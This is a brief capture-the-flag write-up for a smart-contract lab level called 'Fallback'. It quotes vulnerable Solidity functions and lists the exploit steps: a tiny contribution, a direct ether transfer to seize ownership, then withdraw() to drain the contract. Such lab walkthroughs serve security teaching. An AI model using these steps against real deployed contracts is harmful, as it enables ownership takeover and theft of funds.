# 1. Fallback
**claim contract ownership**

```
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```
- requires contributions[msg.sender] > 0
- can use contribute() to send < 0.001 ether to make contribution > 0

```
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
```

- after contribution made, can send from outside ABI
`sendTransaction({from: "[player address]", to: "0xB825AD17f8a0c2e7947cAd5Bc277C873B9505925", value: "1000"})`

**reduce balance to 0**
- after sendTransaction() is called can call withdraw()

```
function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }
```
